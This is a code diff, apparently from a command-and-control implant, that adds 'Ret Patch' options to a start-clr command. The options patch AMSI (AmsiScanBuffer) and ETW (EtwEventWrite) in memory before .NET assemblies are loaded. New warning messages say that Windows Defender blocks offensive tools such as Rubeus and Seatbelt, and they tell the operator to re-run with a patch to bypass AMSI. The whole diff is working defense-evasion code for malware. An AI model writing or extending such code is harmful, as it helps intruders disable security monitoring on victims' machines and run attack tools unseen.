@@ -118,25 +118,45 @@ func (c *StartCLRCommand) Execute(task structs.Task) structs.CommandResult {
 		}
 	}
 
-	// Apply AMSI Autopatch
-	if params.AmsiPatch == "Autopatch" {
+	// Apply AMSI patch
+	switch params.AmsiPatch {
+	case "Autopatch":
 		output += "\n[*] Applying AMSI Autopatch (amsi.dll!AmsiScanBuffer)...\n"
 		patchOutput, err := PerformAutoPatch("amsi.dll", "AmsiScanBuffer", 300)
 		if err != nil {
 			output += fmt.Sprintf("[-] AMSI Autopatch failed: %v\n", err)
 		} else {
+			amsiPatched = true
 			output += patchOutput + "\n"
+		}
+	case "Ret Patch":
+		output += "\n[*] Applying AMSI Ret Patch (amsi.dll!AmsiScanBuffer)...\n"
+		patchOutput, err := PerformRetPatch("amsi.dll", "AmsiScanBuffer")
+		if err != nil {
+			output += fmt.Sprintf("[-] AMSI Ret Patch failed: %v\n", err)
+		} else {
+			amsiPatched = true
+			output += patchOutput
 		}
 	}
 
-	// Apply ETW Autopatch
-	if params.EtwPatch == "Autopatch" {
+	// Apply ETW patch
+	switch params.EtwPatch {
+	case "Autopatch":
 		output += "\n[*] Applying ETW Autopatch (ntdll.dll!EtwEventWrite)...\n"
 		patchOutput, err := PerformAutoPatch("ntdll.dll", "EtwEventWrite", 300)
 		if err != nil {
 			output += fmt.Sprintf("[-] ETW Autopatch failed: %v\n", err)
 		} else {
 			output += patchOutput + "\n"
+		}
+	case "Ret Patch":
+		output += "\n[*] Applying ETW Ret Patch (ntdll.dll!EtwEventWrite)...\n"
+		patchOutput, err := PerformRetPatch("ntdll.dll", "EtwEventWrite")
+		if err != nil {
+			output += fmt.Sprintf("[-] ETW Ret Patch failed: %v\n", err)
+		} else {
+			output += patchOutput
 		}
 	}
 
@@ -172,6 +192,9 @@ func (c *StartCLRCommand) Execute(task structs.Task) structs.CommandResult {
 			if err != nil {
 				output += fmt.Sprintf("[-] Hardware Breakpoint setup failed: %v\n", err)
 			} else {
+				if amsiAddr != 0 {
+					amsiPatched = true
+				}
 				output += hwbpOutput
 			}
 		}
@@ -179,7 +202,9 @@ func (c *StartCLRCommand) Execute(task structs.Task) structs.CommandResult {
 
 	// Summary
 	if params.AmsiPatch == "None" && params.EtwPatch == "None" {
-		output += "\n[*] No patches selected. You may manually patch before executing assemblies."
+		output += "\n[!] WARNING: No AMSI patch applied. Windows Defender will scan assemblies during loading."
+		output += "\n[!] Known offensive tools (Seatbelt, Rubeus, SharpUp, etc.) WILL be blocked."
+		output += "\n[!] Re-run start-clr with Ret Patch, Autopatch, or Hardware Breakpoint to bypass AMSI."
 	} else {
 		output += "\n[+] CLR initialized and patches applied. Ready for assembly execution."
 	}
